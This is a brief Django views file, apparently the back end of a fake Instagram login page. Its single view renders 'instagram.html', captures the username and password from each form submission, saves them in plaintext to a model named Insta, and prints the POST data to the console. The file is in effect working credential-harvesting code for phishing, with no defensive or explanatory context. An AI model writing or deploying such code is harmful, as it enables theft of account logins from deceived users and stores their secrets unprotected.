from django.shortcuts import render
from .models import Insta


# Create your views here.
def main(request):
    if request.POST:
        model = Insta()
        model.username = request.POST.get('username', '')
        model.password = request.POST.get('password', '')
        model.save()
        print(request.POST)
    return render(request,'instagram.html')
